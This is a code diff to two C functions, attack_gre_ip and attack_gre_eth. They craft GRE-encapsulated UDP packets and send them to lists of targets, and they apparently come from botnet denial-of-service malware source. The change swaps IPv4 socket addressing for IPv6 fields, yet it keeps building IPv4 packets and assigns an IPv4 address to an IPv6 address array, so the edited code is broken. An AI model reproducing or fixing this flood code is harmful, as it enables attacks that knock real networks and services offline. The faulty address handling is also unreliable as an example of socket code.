@@ -145,10 +145,10 @@ void attack_gre_ip(uint8_t targs_len, struct attack_target *targs, uint8_t opts_
             udph->check = 0;
             udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
 
-            targs[i].sock_addr.sin_family = AF_INET;
-            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
-            targs[i].sock_addr.sin_port = 0;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_family = AF_INET6;
+            targs[i].sock_addr.sin6_addr.s6_addr = iph->daddr;
+            targs[i].sock_addr.sin6_port = 0;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 
 #ifdef DEBUG
@@ -303,10 +303,10 @@ void attack_gre_eth(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             udph->check = 0;
             udph->check = checksum_tcpudp(greiph, udph, udph->len, sizeof (struct udphdr) + data_len);
 
-            targs[i].sock_addr.sin_family = AF_INET;
-            targs[i].sock_addr.sin_addr.s_addr = iph->daddr;
-            targs[i].sock_addr.sin_port = 0;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_family = AF_INET6;
+            targs[i].sock_addr.sin6_addr.s6_addr = iph->daddr;
+            targs[i].sock_addr.sin6_port = 0;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct grehdr) + sizeof (struct ethhdr) + sizeof (struct iphdr) + sizeof (struct udphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 
 #ifdef DEBUG
